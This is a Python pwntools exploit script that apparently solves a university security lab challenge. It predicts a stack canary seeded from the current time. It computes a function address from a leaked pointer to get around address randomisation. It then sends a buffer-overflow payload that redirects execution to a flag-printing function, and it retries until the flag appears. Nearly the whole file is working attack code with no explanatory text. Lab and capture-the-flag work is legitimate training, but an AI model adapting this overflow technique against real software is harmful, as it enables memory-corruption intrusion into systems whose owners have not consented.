from pwn import *
from ctypes import *

def try_():
    orig_main_addr = 0x0000000000001457
    orig_print_flag_addr = 0x00000000000012ea

    libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')
    libc.srand(libc.time(0))
    canary = libc.rand()

    p = process("/home/csed415-lab02/target")
    line = p.recvline(); # print(line)
    line = p.recvline(); # print(line)
    main_addr = int((str(line).split()[-1][2:-3]), 16)

    print_flag_addr = main_addr - orig_main_addr + orig_print_flag_addr
    print_flag_addr = hex(print_flag_addr)

    payload = b"k" * 24                         # 24 (24)
    payload += p64(canary)                      # 4 (28)
    # payload += b"\0\0\0\0"                    # 4 (32)
    payload += b"k" * 8                         # 8 (40)
    payload += p64(int(print_flag_addr, 16))    # 8 (48)
    payload += b"k" * 16                        # 16 (64)

    p.sendline(payload)
    line = p.recvall(); # print(str(line))
    return line

while True:
    recv = try_()
    if "This is your flag" in str(recv):
        print(type(recv))
        print(recv.decode())
        break
    sleep(0.5)
